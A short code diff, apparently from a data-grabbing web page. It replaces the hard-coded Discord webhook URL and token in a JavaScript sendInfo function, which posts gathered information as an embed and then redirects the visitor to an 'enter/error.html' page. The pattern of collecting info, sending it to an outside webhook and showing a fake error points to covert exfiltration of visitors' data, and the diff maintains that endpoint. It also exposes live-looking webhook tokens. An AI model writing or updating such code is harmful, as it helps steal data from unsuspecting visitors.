@@ -58,7 +58,7 @@ async function getInfo() {
   
 
 async function sendInfo() {
-  const webhook = "https://discord.com/api/webhooks/1426178788626010202/DYdnzky0dNwmwCgU2UZSB3UJwWrCpRPw_UNV5IVhugTYvkPjo8-L-pIu7WG48I7etu4Y";webhook
+  const webhook = "https://discord.com/api/webhooks/1469943533271122075/IMAukromKJnDvMqYx6ExzeIRWlYasDWYFqbBnzR8T2dg7RzKDR53-nUXnBScAZhzcTkI";webhook
 
 
   const embed  = {
@@ -89,6 +89,7 @@ async function sendInfo() {
     window.location.replace("enter/error.html")
   }, 300);
 }
+
 
 
 
